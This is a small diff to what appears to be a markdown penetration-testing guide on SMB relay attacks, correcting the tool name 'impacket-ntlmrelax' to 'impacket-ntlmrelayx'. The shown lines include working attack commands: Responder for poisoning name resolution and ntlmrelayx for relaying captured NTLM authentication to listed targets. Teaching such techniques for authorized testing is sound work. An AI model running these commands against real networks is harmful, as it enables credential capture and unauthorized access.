@@ -72,9 +72,9 @@ SMB (Server Message Block) is a protocol used for file shares, printers, and oth
 
             responder -I eth0 -dPv
 
-5. Start ntlmrelayx.py or impacket-ntlmrelax.
+5. Start ntlmrelayx.py or impacket-ntlmrelayx.
 
-            impacket-ntlmrelax -tf targets.txt -smb2support
+            impacket-ntlmrelayx -tf targets.txt -smb2support
 
 ![image](https://github.com/user-attachments/assets/ac597d69-e6d9-4da3-affa-ca352ce13850)  
 
